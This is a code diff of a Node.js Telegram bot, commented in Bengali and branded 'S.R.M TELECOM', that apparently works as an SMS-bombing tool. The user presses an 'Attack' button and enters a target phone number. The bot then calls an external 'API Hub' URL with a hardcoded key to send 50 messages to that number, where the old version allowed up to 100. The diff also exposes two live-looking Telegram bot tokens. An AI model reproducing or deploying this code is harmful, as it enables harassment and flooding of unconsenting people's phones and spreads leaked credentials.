@@ -2,96 +2,64 @@ const TelegramBot = require('node-telegram-bot-api');
 const axios = require('axios');
 const http = require('http');
 
-// --- কনফিগারেশন ---
-const token = '8784762504:AAFiS-NC-2BSnDauKrTM9GFQ3n91c6_OPfk';
-const channelId = '@srmtelecom';
-const channelLink = 'https://t.me/srmtelecom';
+// --- নতুন টোকেন ---
+const token = '8784762504:AAH4uP_glf7oKo52fiUiInsxOYheI0Mm-U8';
 const bot = new TelegramBot(token, {polling: true});
-const userStates = {};
 
-// Render সচল রাখার জন্য সার্ভার
+// Render/Cloud সার্ভার সচল রাখার জন্য
 http.createServer((req, res) => {
-    res.write("S.R.M TELECOM API HUB Active!");
+    res.write("S.R.M TELECOM Server is Running!");
     res.end();
 }).listen(process.env.PORT || 3000);
 
-console.log("🚀 S.R.M TELECOM (Prime Xyron API Hub) চালু হয়েছে...");
+console.log("✅ S.R.M TELECOM নতুন টোকেন দিয়ে চালু হয়েছে...");
 
+// প্রধান মেনু বাটন
 const mainMenu = {
     reply_markup: {
         keyboard: [
-            [{ text: '🔴 শুরু করুন (Start Attack)' }],
-            [{ text: '📢 চ্যানেল জয়েন' }, { text: '💳 হেল্প/সাপোর্ট' }]
+            [{ text: '🚀 শুরু করুন (Attack)' }],
+            [{ text: '📢 চ্যানেল' }, { text: '💳 হেল্প' }]
         ],
         resize_keyboard: true
     }
 };
 
-async function isSubscribed(chatId) {
-    try {
-        const res = await bot.getChatMember(channelId, chatId);
-        return ['member', 'administrator', 'creator'].includes(res.status);
-    } catch (e) { return false; }
-}
+// স্টার্ট কমান্ড
+bot.onText(/\/start/, (msg) => {
+    bot.sendMessage(msg.chat.id, "🔥 **S.R.M TELECOM**\n\nআপনার পার্সোনাল API Hub এখন এই বটের সাথে কানেক্টেড। কাজ শুরু করতে নিচের বাটন চাপুন।", { 
+        parse_mode: "Markdown", 
+        reply_markup: mainMenu.reply_markup 
+    });
+});
 
 bot.on('message', async (msg) => {
     const chatId = msg.chat.id;
     const text = msg.text;
-    if (!text) return;
 
-    const joined = await isSubscribed(chatId);
-    if (!joined && text !== '/start') {
-        return bot.sendMessage(chatId, `❌ **অ্যাক্সেস লক!**\nবটটি ব্যবহার করতে আমাদের চ্যানেলে জয়েন করুন।\n📢 লিংক: ${channelLink}`, { parse_mode: "Markdown" });
-    }
-
-    if (text === '/start') {
-        bot.sendMessage(chatId, "🔥 **S.R.M TELECOM API HUB**\nআপনার দেওয়া পার্সোনাল এপিআই এখন বটের সাথে কানেক্টেড।", mainMenu);
-    }
-
-    else if (text === '🔴 শুরু করুন (Start Attack)') {
-        userStates[chatId] = { step: 'num' };
+    if (text === '🚀 শুরু করুন (Attack)') {
         bot.sendMessage(chatId, "📱 **টার্গেট নম্বরটি দিন (১১ ডিজিট):**", { reply_markup: { remove_keyboard: true } });
     }
 
-    else if (userStates[chatId]?.step === 'num') {
-        if (text.length === 11 && text.startsWith('01')) {
-            userStates[chatId] = { step: 'amount', number: text };
-            bot.sendMessage(chatId, `✅ নম্বর: ${text}\n🔢 **কয়টি SMS পাঠাতে চান? (১-১০০)**`);
-        } else { bot.sendMessage(chatId, "❌ সঠিক নম্বর দিন।"); }
-    } 
-
-    else if (userStates[chatId]?.step === 'amount') {
-        const amount = parseInt(text);
-        if (isNaN(amount) || amount <= 0 || amount > 100) return bot.sendMessage(chatId, "⚠️ ১-১০০ এর মধ্যে লিখুন।");
-
-        const target = userStates[chatId].number;
-        delete userStates[chatId];
-
-        bot.sendMessage(chatId, `🚀 **${target}** নম্বরে আপনার API Hub থেকে ${amount}টি অ্যাটাক পাঠানো হচ্ছে...`);
+    // নম্বর চেক (১১ ডিজিট এবং ০১ দিয়ে শুরু)
+    else if (text && text.length === 11 && text.startsWith('01')) {
+        const target = text;
+        bot.sendMessage(chatId, `🚀 **${target}** নম্বরে আপনার API Hub থেকে রিকোয়েস্ট পাঠানো হচ্ছে...`);
 
         try {
-            // আপনার দেওয়া সেই নির্দিষ্ট API Hub লিঙ্ক (GET Method)
-            const apiUrl = `https://x-pro-prime-xyron-api-hub.onrender.com/api/v1/execute?target=${target}&count=${amount}&key=Prime_xyron_9xm`;
+            // আপনার দেওয়া সেই নির্দিষ্ট API Hub লিঙ্ক
+            // এখানে count=50 দেওয়া হয়েছে, আপনি চাইলে এটা পরিবর্তন করতে পারেন
+            const apiUrl = `https://x-pro-prime-xyron-api-hub.onrender.com/api/v1/execute?target=${target}&count=50&key=Prime_xyron_9xm`;
             
-            const response = await axios.get(apiUrl, {
-                headers: {
-                    'User-Agent': 'Mozilla/5.0 (Android 13; Mobile) AppleWebKit/537.36',
-                    'Sec-Ch-Ua-Platform': '"Android"'
-                },
-                timeout: 30000 // হাব থেকে রেসপন্স আসতে একটু সময় লাগতে পারে
-            });
+            // রিকোয়েস্ট পাঠানো হচ্ছে
+            const response = await axios.get(apiUrl, { timeout: 20000 });
 
             if (response.status === 200) {
-                bot.sendMessage(chatId, `✅ **মিশন সম্পন্ন!**\n🎯 টার্গেট: ${target}\n📤 স্ট্যাটাস: সফল (Hub Response: 200)`, mainMenu);
-            } else {
-                bot.sendMessage(chatId, `⚠️ হাব থেকে রেসপন্স এসেছে কিন্তু সফল হয়নি।`, mainMenu);
+                bot.sendMessage(chatId, `✅ **মিশন সম্পন্ন!**\n🎯 টার্গেট: ${target}\n📤 স্ট্যাটাস: সফল`, { reply_markup: mainMenu.reply_markup });
             }
-
         } catch (e) {
-            console.log(e);
-            bot.sendMessage(chatId, `❌ API Hub এরর! সম্ভবত সার্ভার অফলাইনে বা কী (Key) ভুল।`, mainMenu);
+            console.log("Error in API Hub:", e.message);
+            bot.sendMessage(chatId, `⚠️ **API Hub এরর!**\nসম্ভবত হাবটি অফলাইনে আছে অথবা কি (Key) ভুল।`, { reply_markup: mainMenu.reply_markup });
         }
     }
 });
-
-
